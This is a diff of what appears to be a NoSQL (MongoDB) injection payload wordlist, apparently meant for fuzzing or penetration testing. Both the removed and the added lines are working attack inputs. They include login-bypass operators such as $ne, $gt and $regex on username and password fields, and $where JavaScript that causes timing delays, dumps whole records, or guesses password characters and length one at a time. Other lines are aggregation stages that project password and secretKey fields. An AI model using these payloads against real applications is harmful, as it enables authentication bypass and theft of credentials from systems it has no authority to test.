@@ -1,42 +1,51 @@
-{"username": {"$ne": null}, "password": {"$ne": null}}
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
-{"username": {"$exists": true}, "password": {"$exists": true}}
-{"username": "admin", "password": {"$ne": null}}
-{"username": "admin", "password": {"$gt": ""}}
-{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
-{"username": "admin", "password": {"$regex": ".*"}}
-
-username[$ne]=invalid&password[$ne]=invalid
-username[$gt]=&password[$gt]=
-username[$exists]=true&password[$exists]=true
-username[$regex]=.*&password[$regex]=.*
-username=admin&password[$ne]=wrongpassword
-
-{"$where": "1==1"}
-{"$where": "sleep(5000)"}
-{"$where": "function() { return true; }"}
-{"$where": "this.username == 'admin'"}
-
-{"$gt": ""}
-{"$gte": ""}
-{"$lt": "~"}
-{"$lte": "~"}
-{"$ne": null}
-{"$ne": ""}
-{"$in": [null, "admin", ""]}
-{"$nin": ["nonexistent"]}
-{"$exists": true}
-{"$regex": ".*"}
-{"$regex": "^admin"}
-
-{"username": "admin", "password": {"$regex": "^a"}}
-{"username": "admin", "password": {"$regex": "^ab"}}
-{"username": "admin", "password": {"$regex": "^abc"}}
-
-{"$where": "this.username == 'admin' && this.password.length > 5"}
-{"$where": "function(){ var x = this.password; if(x[0] == 'a') return true; }"}
-
-{"$where": "function() { sleep(5000); return true; }"}
-{"$where": "if(this.username=='admin'){sleep(5000)}"}
-
-[{"$lookup": {"from": "users", "localField": "id", "foreignField": "_id", "as": "u"}}, {"$project": {"u.password": 1}}]
+{"$gt":""}
+{"$ne":""}
+{"$exists":true}
+{"$regex":".*"}
+{"$where":"1==1"}
+{"$lt":"z"}
+{"$gte":""}
+{"$lte":"z"}
+{"$in":[""]}
+{"$nin":[]}
+{"$not":{"$type":99}}
+{"$type":2}
+{"$or":[{"a":"b"}]}
+{"$and":[{"a":{"$ne":""}}]}
+{"$nor":[{"a":"nonexistent"}]}
+{"$all":[""]}
+{"$elemMatch":{"$ne":""}}
+{"$size":{"$gt":0}}
+{"$mod":[1,0]}
+{"$text":{"$search":"admin"}}
+{"$comment":"injection"}
+{"$options":"i"}
+{"$regex":"^admin","$options":"i"}
+{"$where":"function() { return true; }"}
+{"$where":"this.username == 'admin'"}
+{"$where":"(function(){var d=new Date();while(new Date()-d<5000){}return 1;})()"}
+{"$where":"sleep(5000) || 1==1"}
+{"$where":"Object.keys(this).join(',')"}
+{"$where":"JSON.stringify(this)"}
+{"$where":"this.password.charAt(0) == 'a'"}
+{"$where":"this.password.charAt(0) == 'b'"}
+{"$where":"this.password.charAt(0) == 'p'"}
+{"$where":"this.password.length > 5"}
+{"$where":"this.password.length > 8"}
+{"$where":"this.password.length == 8"}
+{"$where":"this.role == 'admin'"}
+{"$where":"this.isAdmin == true"}
+{"$where":"this.email.match(/@/)"}
+{"$where":"this.email.match(/admin/)"}
+{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"result"}}
+{"$graphLookup":{"from":"users","startWith":"$_id","connectFromField":"_id","connectToField":"_id","as":"result"}}
+{"$facet":{"result":[{"$match":{"role":"admin"}}]}}
+{"$bucket":{"groupBy":"$role","boundaries":["admin"],"default":"other","output":{}}}
+{"$sortByCount":"$role"}
+{"$sample":{"size":100}}
+{"$unwind":"$roles"}
+{"$group":{"_id":"$role","count":{"$sum":1}}}
+{"$project":{"password":1,"secretKey":1}}
+{"$sort":{"_id":-1}}
+{"$limit":1}
+{"$skip":0}
